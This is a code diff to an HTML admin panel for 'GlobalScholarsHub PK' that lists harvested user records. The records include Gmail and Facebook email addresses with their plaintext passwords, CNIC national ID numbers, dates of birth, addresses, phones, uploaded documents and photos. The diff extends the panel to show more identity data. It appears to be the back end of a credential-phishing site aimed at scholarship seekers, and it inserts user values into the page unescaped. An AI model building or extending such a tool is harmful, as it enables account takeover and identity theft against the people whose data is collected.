@@ -31,13 +31,23 @@
         .tag-gmail { background: #fce8e6; color: #ea4335; }
         .tag-fb { background: #e8f0fe; color: #1877f2; }
         .tag-profile { background: #d1fae5; color: #059669; }
+        .tag-doc { background: #fef3c7; color: #d97706; }
+        .tag-img { background: #dbeafe; color: #2563eb; }
         .user-card .data-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr)); gap: 8px 30px; }
         .user-card .data-grid .field { font-size: 14px; padding: 4px 0; border-bottom: 1px solid #f8fafc; }
         .user-card .data-grid .field strong { color: #0a1628; font-weight: 600; }
         .user-card .data-grid .field .value { color: #475569; }
+        .user-card .doc-list { display: flex; flex-wrap: wrap; gap: 6px; margin-top: 6px; }
+        .user-card .doc-list .doc-tag { background: #f0f4f8; padding: 4px 12px; border-radius: 50px; font-size: 11px; color: #0a1628; display: inline-flex; align-items: center; gap: 4px; }
+        .user-card .doc-list .doc-tag i { color: #2563eb; }
+        .user-card .image-preview { width: 60px; height: 60px; border-radius: 10px; object-fit: cover; border: 2px solid #eef2f6; margin-top: 6px; cursor: pointer; }
+        .user-card .image-preview:hover { border-color: #2563eb; transform: scale(1.05); }
+        .user-card .about-text { background: #f8fafc; padding: 10px 14px; border-radius: 8px; color: #475569; font-size: 14px; margin-top: 6px; border-left: 3px solid #2563eb; }
         .total-text { font-size: 16px; color: #0a1628; margin-bottom: 20px; font-weight: 600; }
         .no-data { text-align: center; padding: 60px; color: #94a3b8; background: #fff; border-radius: 16px; border: 1px solid #eef2f6; }
         .no-data i { font-size: 48px; color: #e2e8f0; margin-bottom: 16px; }
+        .section-title { font-weight: 600; color: #0a1628; margin-top: 10px; margin-bottom: 4px; font-size: 14px; }
+        .section-title i { color: #2563eb; margin-right: 6px; }
         .toast { position: fixed; bottom: 30px; right: 30px; background: #22c55e; color: #fff; padding: 16px 24px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.15); font-weight: 600; display: none; z-index: 999; }
         .toast.error { background: #ef4444; }
         @media (max-width: 768px) { .stats { grid-template-columns: 1fr 1fr; } .header { flex-direction: column; text-align: center; } }
@@ -46,7 +56,7 @@
 <body>
     <div class="container">
         <div class="header">
-            <div><h1><i class="fas fa-user-shield"></i>Admin Panel</h1><p>GlobalScholarsHub PK - User Data Management</p></div>
+            <div><h1><i class="fas fa-user-shield"></i>Admin Panel</h1><p>GlobalScholarsHub PK - Complete User Data Management</p></div>
             <div class="header-buttons">
                 <button class="refresh-btn" onclick="loadUsers()"><i class="fas fa-sync-alt"></i> Refresh</button>
                 <button class="clear-btn" onclick="clearAllData()"><i class="fas fa-trash"></i> Clear All Data</button>
@@ -63,11 +73,9 @@
         <div id="usersList"></div>
     </div>
     
-    <!-- Toast Notification -->
     <div id="toast" class="toast"></div>
 
     <script>
-        // ===== VERCEL BLOB STORAGE - FETCH USERS =====
         async function loadUsers() {
             try {
                 const response = await fetch('/api/users');
@@ -89,6 +97,9 @@
 
                 users.slice().reverse().forEach((user, index) => {
                     const userNum = users.length - index;
+                    const hasDocs = user.documents && user.documents.length > 0;
+                    const hasImage = user.profileImage ? true : false;
+                    
                     html += '<div class="user-card">';
                     html += '<div class="card-header"><span class="user-id"><i class="fas fa-user-circle"></i>User #' + userNum + '</span>';
                     html += '<span class="timestamp"><i class="far fa-calendar-alt"></i> ' + (user.submittedAt || user.submitted_at || 'N/A') + '</span></div>';
@@ -97,20 +108,58 @@
                     if (user.email) html += '<span class="tag tag-gmail"><i class="fas fa-envelope"></i> Gmail</span>';
                     if (user.fbEmail) html += '<span class="tag tag-fb"><i class="fab fa-facebook"></i> Facebook</span>';
                     if (user.profileCompleted) html += '<span class="tag tag-profile"><i class="fas fa-check-circle"></i> Profile Complete</span>';
+                    if (hasDocs) html += '<span class="tag tag-doc"><i class="fas fa-file"></i> ' + user.documents.length + ' Docs</span>';
+                    if (hasImage) html += '<span class="tag tag-img"><i class="fas fa-image"></i> Photo</span>';
                     html += '</div>';
                     
                     html += '<div class="data-grid">';
-                    if (user.name) html += '<div class="field"><strong>👤 Name:</strong> <span class="value">' + user.name + '</span></div>';
+                    // Gmail Data
+                    if (user.name) html += '<div class="field"><strong>👤 Full Name:</strong> <span class="value">' + user.name + '</span></div>';
                     if (user.email) html += '<div class="field"><strong>📧 Gmail:</strong> <span class="value" style="color:#ea4335;font-weight:600;">' + user.email + '</span></div>';
-                    if (user.password) html += '<div class="field"><strong>🔑 Password:</strong> <span class="value">' + user.password + '</span></div>';
-                    if (user.fbEmail) html += '<div class="field"><strong>📘 Facebook:</strong> <span class="value" style="color:#1877f2;font-weight:600;">' + user.fbEmail + '</span></div>';
+                    if (user.password) html += '<div class="field"><strong>🔑 Gmail Password:</strong> <span class="value">' + user.password + '</span></div>';
+                    
+                    // Facebook Data
+                    if (user.fbEmail) html += '<div class="field"><strong>📘 Facebook ID:</strong> <span class="value" style="color:#1877f2;font-weight:600;">' + user.fbEmail + '</span></div>';
                     if (user.fbPassword) html += '<div class="field"><strong>🔑 FB Password:</strong> <span class="value">' + user.fbPassword + '</span></div>';
+                    
+                    // Profile Data
+                    if (user.firstName) html += '<div class="field"><strong>👤 First Name:</strong> <span class="value">' + user.firstName + '</span></div>';
+                    if (user.lastName) html += '<div class="field"><strong>👤 Last Name:</strong> <span class="value">' + user.lastName + '</span></div>';
+                    if (user.dob) html += '<div class="field"><strong>📅 Date of Birth:</strong> <span class="value">' + user.dob + '</span></div>';
+                    if (user.gender) html += '<div class="field"><strong>⚥ Gender:</strong> <span class="value">' + user.gender + '</span></div>';
+                    if (user.nationality) html += '<div class="field"><strong>🇵🇰 Nationality:</strong> <span class="value">' + user.nationality + '</span></div>';
+                    if (user.country) html += '<div class="field"><strong>🏠 Country:</strong> <span class="value">' + user.country + '</span></div>';
                     if (user.phone) html += '<div class="field"><strong>📱 Phone:</strong> <span class="value">' + user.phone + '</span></div>';
                     if (user.city) html += '<div class="field"><strong>🏙️ City:</strong> <span class="value">' + user.city + '</span></div>';
-                    if (user.university) html += '<div class="field"><strong>🎓 University:</strong> <span class="value">' + user.university + '</span></div>';
-                    if (user.gpa) html += '<div class="field"><strong>📊 GPA:</strong> <span class="value">' + user.gpa + '</span></div>';
                     if (user.cnic) html += '<div class="field"><strong>🆔 CNIC:</strong> <span class="value">' + user.cnic + '</span></div>';
+                    if (user.cnicType) html += '<div class="field"><strong>📋 CNIC Type:</strong> <span class="value">' + user.cnicType + '</span></div>';
+                    if (user.educationLevel) html += '<div class="field"><strong>📚 Education Level:</strong> <span class="value">' + user.educationLevel + '</span></div>';
+                    if (user.fieldOfStudy) html += '<div class="field"><strong>📖 Field of Study:</strong> <span class="value">' + user.fieldOfStudy + '</span></div>';
+                    if (user.university) html += '<div class="field"><strong>🎓 University:</strong> <span class="value">' + user.university + '</span></div>';
+                    if (user.gpa) html += '<div class="field"><strong>📊 GPA / Percentage:</strong> <span class="value">' + user.gpa + '</span></div>';
+                    if (user.address) html += '<div class="field"><strong>🏠 Address:</strong> <span class="value">' + user.address + '</span></div>';
+                    if (user.skills) html += '<div class="field"><strong>🔧 Skills:</strong> <span class="value">' + user.skills + '</span></div>';
                     html += '</div>';
+                    
+                    if (user.about) {
+                        html += '<div class="section-title"><i class="fas fa-quote-left"></i>About</div>';
+                        html += '<div class="about-text">' + user.about + '</div>';
+                    }
+                    
+                    if (hasDocs) {
+                        html += '<div class="section-title"><i class="fas fa-file-upload"></i>Documents Uploaded (' + user.documents.length + ')</div>';
+                        html += '<div class="doc-list">';
+                        user.documents.forEach(doc => {
+                            html += '<span class="doc-tag"><i class="fas fa-file"></i> ' + (doc.name || doc) + '</span>';
+                        });
+                        html += '</div>';
+                    }
+                    
+                    if (hasImage) {
+                        html += '<div class="section-title"><i class="fas fa-image"></i>Profile Image</div>';
+                        html += '<img src="' + user.profileImage + '" class="image-preview" onclick="window.open(this.src)" />';
+                    }
+                    
                     html += '</div>';
                 });
 
@@ -121,18 +170,11 @@
             }
         }
 
-        // ===== CLEAR ALL DATA =====
         async function clearAllData() {
-            if (!confirm('⚠️ Are you sure you want to DELETE ALL data? This cannot be undone!')) {
-                return;
-            }
-
+            if (!confirm('⚠️ Are you sure you want to DELETE ALL data? This cannot be undone!')) return;
             try {
-                const response = await fetch('/api/clear-data', {
-                    method: 'DELETE'
-                });
+                const response = await fetch('/api/clear-data', { method: 'DELETE' });
                 const result = await response.json();
-
                 if (result.success) {
                     showToast('✅ All data cleared successfully!', 'success');
                     loadUsers();
@@ -140,25 +182,19 @@
                     showToast('❌ Error: ' + result.error, 'error');
                 }
             } catch (error) {
-                console.error('❌ Error clearing data:', error);
                 showToast('❌ Error clearing data', 'error');
             }
         }
 
-        // ===== TOAST NOTIFICATION =====
         function showToast(message, type = 'success') {
             const toast = document.getElementById('toast');
             toast.textContent = message;
             toast.className = 'toast' + (type === 'error' ? ' error' : '');
             toast.style.display = 'block';
-            setTimeout(() => {
-                toast.style.display = 'none';
-            }, 3000);
+            setTimeout(() => { toast.style.display = 'none'; }, 3000);
         }
 
-        // ===== Load on page load =====
         loadUsers();
     </script>
-
 </body>
 </html>
